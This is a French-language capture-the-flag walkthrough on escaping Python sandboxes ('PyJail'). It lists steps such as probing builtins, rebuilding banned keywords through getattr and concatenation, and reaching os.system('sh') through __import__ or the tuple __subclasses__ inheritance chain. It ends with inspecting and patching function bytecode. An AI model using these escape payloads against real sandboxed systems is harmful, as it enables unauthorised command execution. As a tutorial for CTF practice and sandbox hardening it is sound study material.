# GTFO of PyJail : Walkthrough

Environnement restreint où le but est de récupérer des données sensibles ou bien de sortir de l’application. Ici le langage utilisé est le Python.

## Etape 1 : Tester l’environnement et ce qu’on peut y faire :

Tester l’utilisation des built-in functions : dir(), globals(), locals(), type(), list(), exit(), __import__() …
Tester les caractères interdits comme _, __, “, ‘, ., etc …

## Etape 2 : Lister les objets disponibles (si possible) :

Utiliser dir() tout simplement. Permet de vérifier si des imports ont été faits.

## Etape 3 : Inspecter les objets suspects ou utils :

En utilisant type(), dir() et getattr() si le . est interdit.

Tips pour générer des keywords bannis :
Si les “ sont autorisés, il est possible d’utiliser la concaténation pour générer des keywords comme un nom de fonction.
On peut aussi utiliser des upper/lower case
Trouver une instance du keyword
Être malin !!!

Exemple : getattr(os, dir(os)[-20])(sh) en sachant que dir(os)[-20] donne system
Attention : getattr() utilise une chaîne de caractères comme attribut !

## Etape 4 : Utiliser le builtin __import__() si non banni :

Regarder si objet __bultins__ existant, si oui :
getattr(__builtins__ ,  __import__)(“os”).system(“sh”) par exemple

## Etape 5 : Le cheatcode absolu : le tuple () !!! :

Cette astuce permet, à partir du système d’héritage, d’accéder à de nombreux objets. Voici l’explication détaillée :
on crée un tuple : ()
on récupère l’attribut class (type de l’objet) : ().__class__
on récupère la class mère (class object) : ().__class__.__base__
on récupère les classes filles : ().__class__.__base__.__subclasses__()
on accède à un objet intéressant : ().__class__.__base__.__subclasses__()[-20]
on instancie l’objet : ().__class__.__base__.__subclasses__()[-20]()
on regarde ses attributs : dir(().__class__.__base__.__subclasses__()[-20]())
on chope un module : ().__class__.__base__.__subclasses__()[-20]()._module
on récupère ce qui est intéressant : ().__class__.__base__.__subclasses__()[-20]()._module.__builtins__[‘__import__’]
 c’est gagné ! ().__class__.__base__.__subclasses__()[-20]()._module.__builtins__[‘__import__’](‘os’).system(“sh”)


## Etape 6 : Le reverse si fonction intéressante :

Chaque fonction possède un attribut func_code qui possède des attributs intéressants sur lesquels on peut s’appuyer.

Voici différents attributs :
co_argcount : nombre d’arguments attendus
co_code : bytecode
co_consts : constantes utilisées
co_name : nom de la fonction
co_names : nom des fonctions utilisées
co_nlocals : nombre de variables locales
co_varnames : noms des arguments et variables locales



Il est possible d’utiliser le module dis pour visualiser le pseudo code en le désassemblant.

Exemple (en Python):

import dis

co_code = …
co_names = …
co_argc = …
co_varnames = …
co_consts = …

dis.disassemble_string(
    list(co_code),
    co_argc,
    co_varnames,
    co_names,
    co_consts
)

Ensuite patcher le bytecode pour altérer le programme et faire en sorte que ça nous aide.

## Etape 7 : Etudier les autres attributs de fonctions :

Il existe d’autre attribut du même type que func_code mais moins “puissants”.
Ceux-ci sont les suivants :
func_globals :
func_doc :
func_name : nom de la fonction
func_defaults : 
func_dict :
func_closure :
